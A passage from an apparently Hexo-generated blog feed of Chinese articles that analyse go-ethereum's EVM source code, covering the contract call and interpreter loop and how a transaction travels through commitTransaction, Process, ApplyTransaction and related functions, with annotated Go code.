class="keyword">return</span> <span class="literal">nil</span>, errGasUintOverflow</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算此操作花费的gas数量</span></span><br><span class="line">        cost, err = operation.gasCost(in.gasTable, in.evm, contract, stack, mem, memorySize)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> || !contract.UseGas(cost) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, ErrOutOfGas</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> memorySize &gt; <span class="number">0</span> &#123;</span><br><span class="line">            mem.Resize(memorySize)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始执行此操作码对应的操作函数 同时会返回执行结果同时也会更新PC计数器 </span></span><br><span class="line">        <span class="comment">// 大部分的操作码对应的操作函数都是在instructions.go中可以找得到</span></span><br><span class="line">        res, err := operation.execute(&amp;pc, in.evm, contract, mem, stack)</span><br><span class="line">    <span class="comment">// 如果这个操作码是一个返回参数 那么就把需要的内容写入returnData</span></span><br><span class="line">    <span class="comment">// 按理说应该是只有return参数才会有范湖</span></span><br><span class="line">        <span class="keyword">if</span> operation.returns &#123;</span><br><span class="line">            in.returnData = res</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到这里也就意味着一个操作码已经执行完成了 应该根据这次的执行结果来决定下一步的动作</span></span><br><span class="line">    <span class="comment">// 1. 如果执行出错了 直接返回错误</span></span><br><span class="line">    <span class="comment">// 2. 如果只能合约代码中止了(比如断言失败) 那么直接返回执行结果 </span></span><br><span class="line">    <span class="comment">// 3. 如果是暂停指令 则直接返回结果</span></span><br><span class="line">    <span class="comment">// 4. 如果操作符不是一个跳转 则直接PC指向下一个指令 继续循环执行</span></span><br><span class="line">        <span class="keyword">switch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> err != <span class="literal">nil</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        <span class="keyword">case</span> operation.reverts:</span><br><span class="line">            <span class="keyword">return</span> res, errExecutionReverted</span><br><span class="line">        <span class="keyword">case</span> operation.halts:</span><br><span class="line">            <span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">        <span class="keyword">case</span> !operation.jumps:</span><br><span class="line">            pc++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到了这里整个部署合约流程就完成了, 部署合约时是从evm.Create-&gt;run-&gt;interper.run 然后在执行codeCopy指令后把runtime的内容返回出来。 在evm.Create函数中我们也看到了当run执行完成后会把runtime的合约代码最终设置到合约地址名下。 整个合约部署就算完成了。</p><p>分析完合约创建接着就该分析合约调用代码了。 调用智能合约和部署在以太坊交易上看来就是to的地址不在是nil而是一个具体的合约地址了。 同时input的内容不再是整个合约编译后的字节码了而是调用函数和对应的实参组合的内容。 这里就涉及到另一个东西那就是abi的概念。此处我不打算详细说明， abi描述了整个接口的详细信息， 根据abi可以解包和打包input调用的数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 忽略一些隐藏了主线的内容</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(evm *EVM)</span> <span class="title">Call</span><span class="params">(caller ContractRef, addr common.Address, input []<span class="keyword">byte</span>, gas <span class="keyword">uint64</span>, value *big.Int)</span> <span class="params">(ret []<span class="keyword">byte</span>, leftOverGas <span class="keyword">uint64</span>, err error)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> (</span><br><span class="line">        to       = AccountRef(addr)</span><br><span class="line">        snapshot = evm.StateDB.Snapshot()</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// 首先要判断这个合约地址是否存在 如果不存在是否是内置的合约 </span></span><br><span class="line">    <span class="keyword">if</span> !evm.StateDB.Exist(addr) &#123;</span><br><span class="line">        precompiles := PrecompiledContractsHomestead</span><br><span class="line">        <span class="keyword">if</span> evm.ChainConfig().IsByzantium(evm.BlockNumber) &#123;</span><br><span class="line">            precompiles = PrecompiledContractsByzantium</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> precompiles[addr] == <span class="literal">nil</span> &amp;&amp; evm.ChainConfig().IsEIP158(evm.BlockNumber) &amp;&amp; value.Sign() == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="comment">// Calling a non existing account, don't do antything, but ping the tracer</span></span><br><span class="line">            <span class="keyword">if</span> evm.vmConfig.Debug &amp;&amp; evm.depth == <span class="number">0</span> &#123;</span><br><span class="line">                evm.vmConfig.Tracer.CaptureStart(caller.Address(), addr, <span class="literal">false</span>, input, gas, value)</span><br><span class="line">                evm.vmConfig.Tracer.CaptureEnd(ret, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">nil</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, gas, <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        evm.StateDB.CreateAccount(addr)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行进行以太币的转账过程</span></span><br><span class="line">    evm.Transfer(evm.StateDB, caller.Address(), to.Address(), value)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 是不是很熟悉 不管是部署合约还是调用合约都要先创建合约对象 把合约加载出来挂到合约对象下</span></span><br><span class="line">    contract := NewContract(caller, to, value, gas)</span><br><span class="line">    contract.SetCallCode(&amp;addr, evm.StateDB.GetCodeHash(addr), evm.StateDB.GetCode(addr))</span><br><span class="line"></span><br><span class="line">    start := time.Now()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 依然是调用run函数来执行代码 不同之处在于这次的input不在是nil了 而是交易的input内容</span></span><br><span class="line">  <span class="comment">// 在上一节中我们看到CALLDATALOAD这个指令会用到input的内容</span></span><br><span class="line">    ret, err = run(evm, contract, input)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        evm.StateDB.RevertToSnapshot(snapshot)</span><br><span class="line">        <span class="keyword">if</span> err != errExecutionReverted &#123;</span><br><span class="line">            contract.UseGas(contract.Gas)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最终返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> ret, contract.Gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> EVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVM源码分析（二）</title>
      <link href="/code-analysis-2/"/>
      <url>/code-analysis-2/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM源码分析（二）"><a href="#EVM源码分析（二）" class="headerlink" title="EVM源码分析（二）"></a>EVM源码分析（二）</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>在上一文中我们分析了EVM的代码架构以及主要的两个合约。而在交易交给EVM处理之前，其实还有一系列的数据转移操作。</p><p>这篇文章，我们将从交易入手，来看看以太坊究竟是怎么处理交易的。</p><h2 id="从Geth客户端收到交易开始："><a href="#从Geth客户端收到交易开始：" class="headerlink" title="从Geth客户端收到交易开始："></a>从Geth客户端收到交易开始：</h2><p>当一个geth客户端接收到其他节点提交的交易后，它会首先将这笔交易提交给evm进行处理。</p><h3 id="commitTransaction"><a href="#commitTransaction" class="headerlink" title="commitTransaction"></a>commitTransaction</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  minner/worker.go</span></span><br><span class="line"></span><br><span class="line">func (w *worker) commitTransaction(tx *types.Transaction, coinbase common.Address) ([]*types.Log, error) &#123;</span><br><span class="line">   snap := w.current.state.Snapshot()</span><br><span class="line"><span class="comment">//ApplyTransaction函数将一次交易的执行写入数据库，接下来会详细讲</span></span><br><span class="line">   receipt, _, <span class="attr">err</span> := core.ApplyTransaction(w.config, w.chain, &amp;coinbase, w.current.gasPool, w.current.state, w.current.header, tx, &amp;w.current.header.GasUsed, *w.chain.GetVMConfig())</span><br><span class="line">   <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      w.current.state.RevertToSnapshot(snap)</span><br><span class="line">      <span class="keyword">return</span> nil, err</span><br><span class="line">   &#125;</span><br><span class="line">   w.current.txs = append(w.current.txs, tx)</span><br><span class="line">   w.current.receipts = append(w.current.receipts, receipt)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> receipt.Logs, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一笔交易提交到EVM前的主要过程就是上述代码所描述的</p><ol><li>创建当前stateDB的<code>snapshot</code>， 创建<code>snapshot</code>其实就是将<code>leveldb</code>的<code>revisionId</code>自增1，然后将这个<code>revisionId</code>加入到<code>revisionId</code>列表里，然后返回创建的id。</li><li>将交易发送到evm，执行交易， 这步骤后面会重点分析，这个就是我们这次文章主要分析的重点EVM的执行交易过程。</li><li>判断执行结果是否出错，如果出错，则回滚snapshot。 首先找到在<code>revisionId</code>列表里面找到需要回滚的<code>revisionId</code>， 然后将此<code>revisionId</code>里面的所有<code>snapshot</code>依次回滚。</li><li>将当前交易加入到交易列表</li><li>将交易收据加入到交易收据列表</li></ol><h3 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h3><p>Process是个入口函数，所有的交易都需要经过此函数来运行调度。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">receipts    types.Receipts</span><br><span class="line">usedGas     = <span class="keyword">new</span>(uint64)</span><br><span class="line">header      = block.Header()</span><br><span class="line">blockHash   = block.Hash()</span><br><span class="line">blockNumber = block.Number()</span><br><span class="line">allLogs     []*types.Log</span><br><span class="line">gp          = <span class="keyword">new</span>(GasPool).AddGas(block.GasLimit()) <span class="comment">//这里的gaspool时根据当前区块决定的，并且gp其实是一个指针</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// Mutate the block and state according to any hard-fork specs</span></span><br><span class="line"><span class="keyword">if</span> p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == <span class="number">0</span> &#123;</span><br><span class="line">misc.ApplyDAOHardFork(statedb)</span><br><span class="line">&#125;</span><br><span class="line">blockContext := NewEVMBlockContext(header, p.bc, nil)</span><br><span class="line"><span class="comment">/* 新建EVM实例</span></span><br><span class="line"><span class="comment">也创建了EVM解释器，解释器中会根据cgg的配置参数选择对应的jump table</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">vmenv := vm.NewEVM(blockContext, vm.TxContext&#123;&#125;, statedb, p.config, cfg)</span><br><span class="line"><span class="comment">// Iterate over and process the individual transactions</span></span><br><span class="line"><span class="keyword">for</span> i, <span class="attr">tx</span> := range block.Transactions() &#123;</span><br><span class="line">msg, <span class="attr">err</span> := tx.AsMessage(types.MakeSigner(p.config, header.Number), header.BaseFee)</span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> nil, nil, <span class="number">0</span>, fmt.Errorf(<span class="string">"could not apply tx %d [%v]: %w"</span>, i, tx.Hash().Hex(), err)</span><br><span class="line">&#125;</span><br><span class="line">statedb.SetTxContext(tx.Hash(), i)</span><br><span class="line"><span class="comment">/*EVM入口*/</span></span><br><span class="line">receipt, <span class="attr">err</span> := applyTransaction(msg, p.config, gp, statedb, blockNumber, blockHash, tx, usedGas, vmenv)</span><br><span class="line"><span class="comment">/*注意在这里任何一个交易执行失败，都会直接返回err*/</span></span><br><span class="line"><span class="keyword">if</span> err != nil &#123;</span><br><span class="line"><span class="keyword">return</span> nil, nil, <span class="number">0</span>, fmt.Errorf(<span class="string">"could not apply tx %d [%v]: %w"</span>, i, tx.Hash().Hex(), err)</span><br><span class="line">&#125;</span><br><span class="line">receipts = append(receipts, receipt)</span><br><span class="line">allLogs = append(allLogs, receipt.Logs...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Fail if Shanghai not enabled and len(withdrawals) is non-zero.</span></span><br><span class="line">withdrawals := block.Withdrawals()</span><br><span class="line"><span class="keyword">if</span> len(withdrawals) &gt; <span class="number">0</span> &amp;&amp; !p.config.IsShanghai(block.Time()) &#123;</span><br><span class="line"><span class="keyword">return</span> nil, nil, <span class="number">0</span>, fmt.Errorf(<span class="string">"withdrawals before shanghai"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Finalize the block, applying any consensus engine specific extras (e.g. block rewards)</span></span><br><span class="line">p.engine.Finalize(p.bc, header, statedb, block.Transactions(), block.Uncles(), withdrawals)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> receipts, allLogs, *usedGas, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ApplyTransaction"><a href="#ApplyTransaction" class="headerlink" title="ApplyTransaction"></a>ApplyTransaction</h3><p>接下来我们主要分析ApplyTransaction函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core/state_processor.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ApplyTransaction 尝试将一次交易的执行写入数据库，并且为执行环境准备输入参数。它返回交易的收据。</span></span><br><span class="line"><span class="comment">// 如果gasg 使用完，或者交易执行出现error，则表示该块无效。</span></span><br><span class="line">func ApplyTransaction(config *params.ChainConfig, bc ChainContext, author *common.Address, gp *GasPool, statedb *state.StateDB, header *types.Header, tx *types.Transaction, usedGas *uint64, cfg vm.Config) (*types.Receipt, uint64, error) &#123;</span><br><span class="line">   msg, <span class="attr">err</span> := tx.AsMessage(types.MakeSigner(config, header.Number))</span><br><span class="line">   <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 创建一个新的evm执行上下文环境</span></span><br><span class="line">   context := NewEVMContext(msg, header, bc, author)</span><br><span class="line">   <span class="comment">// 创建一个包含所有相关信息的新环境， 包括事务和调用机制</span></span><br><span class="line">   vmenv := vm.NewEVM(context, statedb, config, cfg)</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">让EVM执行该交易</span></span><br><span class="line"><span class="comment">Params</span></span><br><span class="line"><span class="comment">@ vmenv：虚拟机实例</span></span><br><span class="line"><span class="comment">@ gp：gaspool</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">returns：</span></span><br><span class="line"><span class="comment">@ gas：该交易执行结束时使用了多少gas</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">   _, gas, failed, <span class="attr">err</span> := ApplyMessage(vmenv, msg, gp)<span class="comment">/* ApplyMessage 先生成了一个StateTransition对象，然后调用其TransitionDB方法开始交给虚拟机运行 */</span></span><br><span class="line">   <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      <span class="keyword">return</span> nil, <span class="number">0</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// Update the state with pending changes</span></span><br><span class="line">   <span class="keyword">var</span> root []byte</span><br><span class="line">   <span class="keyword">if</span> config.IsByzantium(header.Number) &#123;</span><br><span class="line">      statedb.Finalise(<span class="literal">true</span>)</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      root = statedb.IntermediateRoot(config.IsEIP158(header.Number)).Bytes()</span><br><span class="line">   &#125;</span><br><span class="line">   *usedGas += gas</span><br><span class="line"></span><br><span class="line">   <span class="comment">//创建一个新的收据为这笔交易，存储中间状态根和gas使用情况</span></span><br><span class="line">   <span class="comment">// based on the eip phase, we're passing whether the root touch-delete accounts.</span></span><br><span class="line">   receipt := types.NewReceipt(root, failed, *usedGas)</span><br><span class="line">   receipt.TxHash = tx.Hash()</span><br><span class="line">   receipt.GasUsed = gas</span><br><span class="line">   <span class="comment">//如果这笔交易是创建一个合约， 存储合约地址在收据里面</span></span><br><span class="line">   <span class="keyword">if</span> msg.To() == nil &#123;</span><br><span class="line">      receipt.ContractAddress = crypto.CreateAddress(vmenv.Context.Origin, tx.Nonce())</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 设置收据日志和创建布隆过滤器</span></span><br><span class="line">   receipt.Logs = statedb.GetLogs(tx.Hash())</span><br><span class="line">   receipt.Bloom = types.CreateBloom(types.Receipts&#123;receipt&#125;)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> receipt, gas, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实就出现了最核心的TransitionDb函数，我们后面会讲到</p><h3 id="AsMessage-函数"><a href="#AsMessage-函数" class="headerlink" title="AsMessage 函数"></a>AsMessage 函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core/types/transactions.go</span></span><br><span class="line">func (tx *Transaction) AsMessage(s Signer) (Message, error) &#123;</span><br><span class="line">   msg := Message&#123;</span><br><span class="line">      nonce:      tx.data.AccountNonce,</span><br><span class="line">      gasLimit:   tx.data.GasLimit,</span><br><span class="line">      gasPrice:   <span class="keyword">new</span>(big.Int).Set(tx.data.Price),</span><br><span class="line">      to:         tx.data.Recipient,</span><br><span class="line">      amount:     tx.data.Amount,</span><br><span class="line">      data:       tx.data.Payload,</span><br><span class="line">      checkNonce: <span class="literal">true</span>,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> err error</span><br><span class="line">   msg.from, err = Sender(s, tx)</span><br><span class="line">   <span class="keyword">return</span> msg, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将tx 里面的数据填充到msg里面, 这个过程主要是将交易里面的form address 利用 ecrevoer函数恢复出来。</p><h3 id="NewEVMContext-函数"><a href="#NewEVMContext-函数" class="headerlink" title="NewEVMContext 函数"></a>NewEVMContext 函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//core/vm/evm.go</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// NewEVMContext creates a new context for use in the EVM.</span></span><br><span class="line">func NewEVMContext(msg Message, header *types.Header, chain ChainContext, author *common.Address) vm.Context &#123;</span><br><span class="line">   <span class="comment">//如果不能得到一个明确的author,那就从区块头里面解析author</span></span><br><span class="line">   <span class="keyword">var</span> beneficiary common.Address</span><br><span class="line">   <span class="comment">//如果函数参数里面的author为nil,则从区块头里面解析author， 这里不叫coinbase 主要是为了区别ehthash与clique引擎</span></span><br><span class="line">    <span class="keyword">if</span> author == nil &#123;</span><br><span class="line">      beneficiary, _ = chain.Engine().Author(header) <span class="comment">// Ignore error, we're past header validation</span></span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      beneficiary = *author</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> vm.Context&#123;</span><br><span class="line">      CanTransfer: CanTransfer,</span><br><span class="line">      Transfer:    Transfer,</span><br><span class="line">      GetHash:     GetHashFn(header, chain),</span><br><span class="line">      Origin:      msg.From(),</span><br><span class="line">      Coinbase:    beneficiary,</span><br><span class="line">      BlockNumber: <span class="keyword">new</span>(big.Int).Set(header.Number),</span><br><span class="line">      Time:        <span class="keyword">new</span>(big.Int).Set(header.Time),</span><br><span class="line">      Difficulty:  <span class="keyword">new</span>(big.Int).Set(header.Difficulty),</span><br><span class="line">      GasLimit:    header.GasLimit,</span><br><span class="line">      GasPrice:    <span class="keyword">new</span>(big.Int).Set(msg.GasPrice()),</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>填充vm.Context的各项内容，并返回一个Context对象</p><h3 id="NewEVM函数"><a href="#NewEVM函数" class="headerlink" title="NewEVM函数"></a>NewEVM函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">func NewEVM(ctx Context, statedb StateDB, chainConfig *params.ChainConfig, vmConfig Config) *EVM &#123;</span><br><span class="line">   evm := &amp;EVM&#123;</span><br><span class="line">      Context:      ctx,</span><br><span class="line">      StateDB:      statedb,</span><br><span class="line">      vmConfig:     vmConfig,</span><br><span class="line">      chainConfig:  chainConfig,</span><br><span class="line">      chainRules:   chainConfig.Rules(ctx.BlockNumber),</span><br><span class="line">      interpreters: make([]Interpreter, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> chainConfig.IsEWASM(ctx.BlockNumber) &#123;</span><br><span class="line">      <span class="comment">// to be implemented by EVM-C and Wagon PRs.</span></span><br><span class="line">      <span class="comment">// if vmConfig.EWASMInterpreter != "" &#123;</span></span><br><span class="line">      <span class="comment">//  extIntOpts := strings.Split(vmConfig.EWASMInterpreter, ":")</span></span><br><span class="line">      <span class="comment">//  path := extIntOpts[0]</span></span><br><span class="line">      <span class="comment">//  options := []string&#123;&#125;</span></span><br><span class="line">      <span class="comment">//  if len(extIntOpts) &gt; 1 &#123;</span></span><br><span class="line">      <span class="comment">//    options = extIntOpts[1..]</span></span><br><span class="line">      <span class="comment">//  &#125;</span></span><br><span class="line">      <span class="comment">//  evm.interpreters = append(evm.interpreters, NewEVMVCInterpreter(evm, vmConfig, options))</span></span><br><span class="line">      <span class="comment">// &#125; else &#123;</span></span><br><span class="line">      <span class="comment">//     evm.interpreters = append(evm.interpreters, NewEWASMInterpreter(evm, vmConfig))</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">      panic(<span class="string">"No supported ewasm interpreter yet."</span>)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//vmConfig.EVMInterpreter 将会被使用在EVM-C， 这里不会使用。</span></span><br><span class="line">   <span class="comment">//因为我们希望内置的EVM作为出错转移的备用选项 </span></span><br><span class="line">   evm.interpreters = append(evm.interpreters, NewEVMInterpreter(evm, vmConfig))</span><br><span class="line">   evm.interpreter = evm.interpreters[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> evm</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ApplyMessage函数"><a href="#ApplyMessage函数" class="headerlink" title="ApplyMessage函数"></a>ApplyMessage函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ApplyMessage 通过给定的message计算新的DB状态，继而改变旧的DB状态</span></span><br><span class="line"><span class="comment">// ApplyMessage 返回EVM执行的返回结果和gas使用情况（包括gas refunds）和error(如果有错误出现)。</span></span><br><span class="line"><span class="comment">// 如果一个错误总是作为一个core error 出现，那么这个message将永远不会被这个区块所接受。</span></span><br><span class="line">func ApplyMessage(evm *vm.EVM, msg Message, gp *GasPool) ([]byte, uint64, bool, error) &#123;</span><br><span class="line">   <span class="keyword">return</span> NewStateTransition(evm, msg, gp).TransitionDb()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的分为两个函数执行一个是NewStateTransition 函数，这个函数主要是设置一些交易执行的必要参数。</p><p>TransitionDb 这个函数则是主要负责执行交易，影响Db状态。</p><h3 id="TransitionDb-函数"><a href="#TransitionDb-函数" class="headerlink" title="TransitionDb 函数"></a>TransitionDb 函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 